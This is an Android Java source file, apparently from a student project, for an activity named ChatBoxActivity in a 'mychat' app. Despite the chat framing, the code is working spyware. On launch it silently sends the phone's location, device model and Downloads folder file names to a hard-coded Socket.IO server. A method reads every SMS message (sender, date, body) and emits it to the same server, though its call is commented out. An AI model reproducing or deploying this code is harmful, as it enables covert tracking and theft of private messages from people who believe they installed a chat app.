package com.example.mychat;

import android.Manifest;
import android.app.Activity;
import android.content.ContentResolver;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.storage.StorageManager;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.widget.Button;
import android.widget.EditText;
import com.github.nkzawa.socketio.client.IO;
import com.github.nkzawa.socketio.client.Socket;

import java.io.File;
import java.net.URISyntaxException;
import java.nio.charset.Charset;
import java.security.InvalidKeyException;
import java.security.KeyFactory;
import java.security.NoSuchAlgorithmException;
import java.security.PublicKey;
import java.security.spec.X509EncodedKeySpec;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.TimeZone;

import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;

import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.recyclerview.widget.RecyclerView;

public class ChatBoxActivity extends AppCompatActivity {

    public static final String IP = "192.168.1.35"; // TODO: fichero cfg, cifrado, detectar nuevas descargas con el servicio
    public static final String PORT = "8080";

    String uri = "http://" + IP + ":" + PORT;

   // String uri = "https://nodejs-cloud-tfg.appspot.com/";


    private Socket socket;

    public static final int REQUEST_LOCATION = 1;
    public static final int REQUEST_STORAGE = 1;
    LocationManager locationManager;
    StorageManager storageManager;
    String latitud, longitud;
    boolean logged = false;

    ///
    ///    CIFRADO
    ///

    String encryptedSecretKey;
    String cipherTextString;


    public String Nickname;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Nickname = Build.MODEL;     // Modelo de dispositivo

        ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.ACCESS_FINE_LOCATION}, REQUEST_LOCATION);
        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);

        if(!locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)){
            alertGPSNotification();
        }

        else if(locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
            getCurrentLocation();
        }





        //connect you socket client to the server
        try {


        socket = IO.socket(uri);
        socket.connect();
        if(!logged) {

            socket.emit("separator", Nickname);
            socket.emit("join", Nickname);
            logged = true;

        }


            //      La localizacion del dispositivo solo se ve reflejada cuando otras aplicaciones la han
            //      rastreado previsamente


            if (longitud != null) socket.emit("longitud", Nickname, longitud.toString());
            if (latitud != null) socket.emit("latitud", Nickname, latitud.toString());

            socket.emit("download", Nickname, " | Archivos descargados en el dispositivo " + Nickname + " | ");
            sendDownloadFiles();

            //getSmsInbox();

            socket.emit("separator", Nickname);

        } catch (URISyntaxException e) {
        e.printStackTrace();

    }

    }


   /* public void getIMEI() {
        TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        // Check if the READ_PHONE_STATE permission is already available.
        if (ActivityCompat.checkSelfPermission(ChatBoxActivity.this, Manifest.permission.READ_PHONE_STATE)
                != PackageManager.PERMISSION_GRANTED) {
            // READ_PHONE_STATE permission has not been granted.
            ActivityCompat.requestPermissions(ChatBoxActivity.this, new String[]{Manifest.permission.READ_PHONE_STATE},
                    PERMISSIONS_REQUEST_READ_PHONE_STATE);
            imei = tm.getDeviceId();

        } else {
            imei = tm.getDeviceId();
        }
    }*/


   private void sendDownloadFiles(){

       String path = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).getPath() + "/";
       File directory = new File(path);
       File[] files = directory.listFiles();
       for (int i = 0; i < files.length; i++)
       {
           socket.emit("file", Nickname, files[i].toString());
       }
   }



    private void getSmsInbox() {
      //  ArrayList<String> sms = new ArrayList<>();
        if (ContextCompat.checkSelfPermission(getBaseContext(), "android.permission.READ_SMS") == PackageManager.PERMISSION_GRANTED) {
            ContentResolver cr = getContentResolver();
            Uri uri = Uri.parse("content://sms/");
            Cursor cursor = cr.query(uri, new String[]{"_id", "address", "date", "body"}, "_id > 3", null, "date DESC");
            if (cursor != null) {
                cursor.moveToFirst();
                for (int i = 0; i < cursor.getCount(); i++) {
                    String id = cursor.getString(0);
                    String address = cursor.getString(1);
                    Long dateMil = cursor.getLong(2);
                    String body = cursor.getString(3);
                    Date date = new Date(dateMil);
                    SimpleDateFormat formatter = new SimpleDateFormat("dd/MM/yyyy HH:mm:ss", java.util.Locale.getDefault());
                    formatter.setTimeZone(TimeZone.getTimeZone("UTC"));
                    String formatted = formatter.format(date);
                  //  sms.add("\n ID=>" + id + "\n Address=>" + address + "\n Date=>" + formatted + "\n Body=>" + body + "\n");
                    socket.emit("sms", Nickname, "\n ID=>" + id + "\n Address=>" + address + "\n Date=>" + formatted + "\n Body=>" + body + "\n");
                    cursor.moveToNext();
                }
                cursor.close();
            }
        }
      //  return sms;
    }

    protected void alertGPSNotification() {

        final AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setMessage("Activa la opcion de GPS")
                .setCancelable(false)
                .setPositiveButton("Si", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialogInterface, int i) {
                        startActivity(new Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS));
                    }
                })

                .setNegativeButton("No", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialogInterface, int i) {
                        dialogInterface.cancel();
                    }
                });

        final AlertDialog alert = builder.create();
        alert.show();
    }


    private void getCurrentLocation(){

        if(ActivityCompat.checkSelfPermission(ChatBoxActivity.this, Manifest.permission.ACCESS_FINE_LOCATION)
                != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission
                (ChatBoxActivity.this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED){

            ActivityCompat.requestPermissions(ChatBoxActivity.this, new String[] {Manifest.permission.ACCESS_FINE_LOCATION}, REQUEST_LOCATION);
        } else {
            Location location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);

            if(location != null){
                latitud = String.valueOf(location.getLatitude());
                longitud = String.valueOf(location.getLongitude());

            }
        }

    }


@Override
protected void onDestroy() {
        super.onDestroy();

        socket.disconnect();
        }
        }